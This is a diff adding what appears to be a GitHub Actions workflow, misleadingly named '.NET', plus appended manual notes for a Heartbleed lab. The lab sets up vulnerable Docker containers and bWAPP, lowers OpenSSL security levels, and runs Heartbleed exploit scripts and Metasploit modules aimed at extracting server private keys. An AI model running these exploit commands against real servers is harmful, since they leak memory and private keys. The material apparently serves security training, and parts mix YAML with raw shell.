@@ -1,0 +1,165 @@
+name: .NET
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v1
+      with:
+        dotnet-version: 5.0.x
+    - name: makedir
+      run: sudo mkdir -p /home/etudiant
+
+    # - name: check user
+    #   run: whoami
+
+
+    # - name: dockerinstall chmod
+    #   run: sudo chmod +x ./bash/install-docker.sh
+
+      
+    # - name: dockerinstall test
+    #   run: sudo ./bash/install-docker.sh
+
+    - name: vulnerable preparing
+      run: | 
+       sudo apt-get update -y && sudo apt-get install -y python docker-compose
+       docker pull andrewmichaelsmith/docker-heartbleed
+      #  git clone https://github.com/injcristianrojas/heartbleed-example.git
+      #  cd heartbleed-example
+      #  sudo docker-compose up &
+      #  docker run -d andrewmichaelsmith/docker-heartbleed
+
+    - name: vulnerable chmod
+      run: sudo chmod +x ./bash/heartbleed-vulnerable-server.sh 
+
+
+    - name: vulnerable
+      run: sudo ./bash/heartbleed-vulnerable-server.sh
+
+
+    - name: docker image
+      run: sudo docker image ls    
+      
+      
+    - name: pentest chmod
+      run: sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
+    - name: openssl generate certificate 
+      run: sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt -subj "/C=FR/ST=Vitry/L=Vitry/O=Goldorak CA/OU=Green Lantern sux/CN=$VMIP"
+
+    
+    - name: pentest 
+      run: sudo ./bash/heartbleed-vulnerable-pentest.sh
+      # run: sleep 500 && sudo ./bash/heartbleed-vulnerable-pentest.sh
+#     - name: Test
+#       run: sudo mono main.exe
+
+
+
+# if manually installed
+##### on all server
+# sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+
+##### vulnerable server part :
+# sudo chmod +x ./bash/heartbleed-vulnerable-server.sh && sudo ./bash/heartbleed-vulnerable-server.sh
+
+
+##### injection server -- simulate client request
+
+# sudo apt-get update -y && sudo apt-get install -y git python && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+# cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
+# sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
+# cd /home/etudiant/heartbleed-example && python stimulate_server.py -a $ip 
+
+
+
+##### pentest server
+# sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
+#### set IP
+# nano ./conffiles/hostlist.txt && nano ./bash/heartbleed-vulnerable-pentest.sh
+# execute file
+# sudo ./bash/heartbleed-vulnerable-pentest.sh
+
+
+##### exploit via metapsloit
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit.sh && sudo ./metasploit.sh
+
+
+
+
+
+
+
+
+
+
+# ========================================================================================================================================
+# if manually installed
+##### on all server
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+
+##### vulnerable server part :
+sudo chmod +x ./bash/heartbleed-vulnerable-server.sh && sudo ./bash/heartbleed-vulnerable-server.sh
+
+
+
+##### injection server -- simulate client request
+
+sudo apt-get update -y && sudo apt-get install -y git python && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
+sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
+cd /home/etudiant/heartbleed-example && python stimulate_server.py -a $ip 
+
+
+
+##### pentest server
+cd heartbleed-automation/ && sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
+#### set IP
+nano ./conffiles/hostlist.txt && nano ./bash/heartbleed-vulnerable-pentest.sh
+# execute file
+sudo ./bash/heartbleed-vulnerable-pentest.sh
+cd /home/etudiant/heartbleed-example
+watch sudo python heartbleed.py 192.168.1.173 -p 443
+
+
+################ + d'information décodée
+cd ./python/ && chmod +x exploit.python
+watch sudo python exploit.py 192.168.1.173 -p 443  
+10.10.3.155
+
+
+##### exploit via metasploit
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed.sh && sudo ./metasploit_heartbleed.sh
+
+##### exploit via metasploit for private KEYS
+
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed_keys.sh && sudo ./metasploit_heartbleed_keys.sh
+
+- verify on server:
+  - connect to the container
+   dockerps_id=$(sudo docker ps | grep heartbleed | tr -s ' ' | cut -f 1 -d ' ') 
+   dockerps_id=$(sudo docker exec -it $dockerps_id bash) 
+
+watch /etc/apache2/ssl/apache.key
+
+watch 'cat /etc/apache2/ssl/apache.key; cat /etc/apache2/ssl/apache.crt'
+
+
+
+
+##### vulnerable server via BWAPP Docker container
+sudo hostnamectl set-hostname bwapp
+sudo chmod +x ./bash/install-docker.sh && sudo ./bash/install-docker.sh
+sudo docker run -d -p 80:80 -p 8443:8443 raesene/bwapp && ip a
